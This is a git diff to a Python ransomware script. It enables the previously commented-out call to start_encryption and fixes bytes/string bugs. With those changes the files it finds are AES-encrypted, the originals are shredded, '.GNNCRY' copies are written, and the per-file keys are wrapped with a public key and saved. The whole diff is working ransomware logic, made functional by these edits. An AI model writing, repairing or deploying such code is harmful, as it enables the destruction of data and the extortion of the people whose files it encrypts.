@@ -1,4 +1,3 @@
-#!/bin/bash/env python
 # coding=UTF-8
 
 import os
@@ -94,7 +93,7 @@ def start_encryption(files):
         key = generate_keys.generate_key(128, True)
         AES_obj = symmetric.AESCipher(key)
         
-        found_file = base64.b64decode(found_file)
+        # found_file = base64.b64decode(found_file)
 
         # try open the file to encrypt it
         try:
@@ -108,7 +107,7 @@ def start_encryption(files):
         shred(found_file)
 
         # append the encrypted one at the end. 
-        new_file_name = found_file + ".GNNCRY"
+        new_file_name = found_file + ".GNNCRY".encode()
         with open(new_file_name, 'wb') as f:
             f.write(encrypted)
 
@@ -173,8 +172,8 @@ def menu():
 
 
     # FILE ENCRYPTION STARTS HERE !!!
-    # aes_keys_and_base64_path = start_encryption(files)
-    # enc_aes_key_and_base64_path = []
+    aes_keys_and_base64_path = start_encryption(files)
+    enc_aes_key_and_base64_path = []
     
 
     # The aes_keys_and_based_64_path is a list of tuples. 
@@ -188,7 +187,6 @@ def menu():
         encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
         # So, you got lots of key,path pairs signed. 
         enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
-    
     # free the old AES keys
     aes_keys_and_base64_path = None
     del aes_keys_and_base64_path
@@ -197,9 +195,8 @@ def menu():
     # save to disk -> ENC(AES) BASE64(PATH)
     with open(ransomware_path + "/AES_encrypted_keys.txt", 'w') as f:
         for _ in enc_aes_key_and_base64_path:
-            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
-            f.write(line)
-
+            line = base64.b64encode(_[0]) + " ".encode() + _[1] + "\n".encode()
+            f.write(line.decode())
     enc_aes_key_and_base64_path = None
     del enc_aes_key_and_base64_path
     gc.collect()
